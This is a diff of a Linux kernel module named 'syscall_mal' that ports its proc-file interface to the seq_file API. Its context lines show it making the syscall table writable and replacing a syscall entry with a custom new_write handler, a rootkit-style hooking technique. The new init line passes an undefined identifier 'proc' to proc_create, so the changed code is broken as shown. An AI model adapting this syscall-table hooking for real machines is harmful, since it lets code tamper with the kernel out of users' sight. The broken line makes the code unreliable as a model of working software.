@@ -32,20 +32,25 @@ char *buff;
 int buff_length;
 //Proc File variables
 const char procFile[] = "syscall_mal";
-struct proc_dir_entry *proc_input;
 
-int procfile_read(char *buff,char **buff_location,
-	      off_t offset, int buffer_length, int *eof, void *data)
-{
-	int buff_size = buff_length;
-	if (offset > 0) {
-		buff_size  = 0;
-	} else {
-		buff_size = sprintf(buff, "HelloWorld!\n"); //Change
-	}
-
-	return buff_size;
+static int proc_show(struct seq_file *m, void *v) {
+  seq_printf(m, "Hello proc!\n");
+  return 0;
 }
+
+static int proc_open(struct inode *inode, struct  file *file) {
+  return single_open(file, proc_show, NULL);
+}
+
+static const struct file_operations proc_input = {
+  .owner = THIS_MODULE,
+  .open = proc_open,
+  .read = seq_read,
+  .llseek = seq_lseek,
+  .release = single_release,
+};
+
+
 
 static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
 {
@@ -103,21 +108,14 @@ static void replace_syscall(ulong offset, ulong func_address)
 
 static int init_syscall(void)
 {
-        proc_input = proc_create(procFile, 0644, NULL);
-        if (proc_input == NULL) {
-          remove_proc_entry(procFile, NULL);
-          return -ENOMEM;
-        }
-        proc_input->mode = S_IFREG | S_IRUGO;
-        proc_input->uid = 0;
-        proc_input->gid = 0;
-        proc_input->size = 50;
+        proc_create(procFile, 0, NULL,proc);
         replace_syscall(SYSCALL_NI, (ulong)new_write);
         return 0;
 }
 
 static void cleanup_syscall(void)
 {
+        remove_proc_entry(procFile,NULL);
         page_read_write((ulong)syscall_table);
         syscall_table[SYSCALL_NI] = (ulong)original_syscall;
         page_read_only((ulong)syscall_table);
